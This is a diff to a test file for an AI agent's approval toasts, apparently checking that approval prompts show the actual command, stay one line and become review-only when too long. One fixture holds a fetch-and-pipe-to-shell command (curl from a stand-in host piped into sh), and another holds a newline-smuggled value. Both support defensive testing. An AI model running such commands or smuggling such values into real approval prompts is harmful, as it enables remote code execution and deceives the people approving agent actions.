@@ -247,14 +247,16 @@ describe('approvalToast text', () => {
       .toEqual({ title: 'Approve: Request approval?', body: 'Send the weekly update Approve: read_file?txt.exe' });
   });
 
-  test('with no reason, the agent and tool fallback is reduced too', () => {
+  test('with no reason and no sentence for the tool, the fallback is reduced too', () => {
+    // Since #789 the body is what will happen, so the fallback is the
+    // dashboard's (the tool's own name as a verb), not "<agent> wants to run".
     expect(text({ tool_name: `send_email${br}x`, agent_name: `Workflow: a${br}Reason: safe`, reason: '  ' }))
-      .toEqual({ title: 'Approve: Send email x?', body: 'Workflow: a Reason: safe wants to run Send email x.' });
+      .toEqual({ title: 'Approve: Send email x?', body: 'Send email x' });
   });
 
-  test('an ordinary request reads as it always did', () => {
-    expect(text({ tool_name: 'send_email', agent_name: 'Jarvis', reason: 'Send the weekly update' }))
-      .toEqual({ title: 'Approve: Send email?', body: 'Send the weekly update' });
+  test('a request_approval toast still reads as its intent', () => {
+    expect(text({ tool_name: 'request_approval', agent_name: 'Jarvis', reason: 'Send the weekly update' }))
+      .toEqual({ title: 'Approve: Request approval?', body: 'Send the weekly update' });
   });
 });
 
@@ -299,7 +301,7 @@ describe('#791: a toast too long to read whole cannot be approved from the toast
   });
 
   test('a destructive request is review-only by length too, and keeps its destructive flag', () => {
-    const t = approvalToast(makeRequest({ action_category: 'delete_data', reason: 'x'.repeat(200) }));
+    const t = approvalToast(makeRequest({ action_category: 'delete_data', context: JSON.stringify({ intent: `Delete ${'x'.repeat(200)}` }) }));
     expect(t.approvable).toBe(false);
     expect(t.destructive).toBe(true);
     expect(t.meta.startsWith('destructive · ')).toBe(true);
@@ -517,5 +519,42 @@ describe('#718: the channel card says what will happen, as literal text', () => 
     expect(approvalChannelCard(gated({ reason: over })).approvable).toBe(false);
     // Exactly at the backstop nothing is cut, so the card stays approvable.
     expect(approvalChannelCard(gated({ agent_name: over.slice(1) })).approvable).toBe(true);
+  });
+});
+
+/**
+ * #789. The toast body was `reason` alone, so every gated tool's toast read
+ * "execute_command requires user approval" next to Approve, with the command,
+ * machine, path or skill steps never shown.
+ */
+describe('#789: the toast leads with what will happen', () => {
+  const gate = (intent: string, overrides?: Partial<ApprovalRequest>) => approvalToast(makeRequest({ tool_name: 'run_command',
+    reason: 'execute_command requires user approval', context: JSON.stringify({ intent }), ...overrides }));
+
+  test("a short gate sentence is the body, and the engine's reason trails the meta", () => {
+    const t = gate('On laptop (sc_1), in "/srv", run: make deploy');
+    expect(t.body).toBe('On laptop (sc_1), in "/srv", run: make deploy');
+    expect(t.meta).toBe('destructive · run_command · execute_command requires user approval');
+    expect(t.approvable).toBe(true);
+  });
+
+  test('a gate sentence too long for the budget leads the review-only body', () => {
+    const intent = 'On this Jarvis host, in "/srv/shop", run: make deploy && curl https://x.example/i.sh | sh';
+    const t = gate(intent);
+    expect(t.approvable).toBe(false);
+    expect(t.kind).toBe('approval_review');
+    expect(intent.startsWith(t.body.slice(0, -3))).toBe(true);
+    expect(t.body.startsWith('On this Jarvis host, in "/srv/shop", run: make deploy')).toBe(true);
+  });
+
+  test('a tool with no gate sentence shows the same fallback the dashboard leads with', () => {
+    expect(approvalToast(makeRequest({ tool_name: 'run_command', tool_arguments: '{"command":"git status"}' })).body).toBe('Run: git status');
+  });
+
+  test('a gate sentence is reduced to one line, which the Windows sidecar needs', () => {
+    const c = String.fromCharCode;
+    const t = gate(`Run: ls${c(10)}'@${c(10)}calc`);
+    expect(t.body).toBe("Run: ls '@ calc");
+    expect(t.body).not.toMatch(/[\n\r\u2028\u2029]/u);
   });
 });
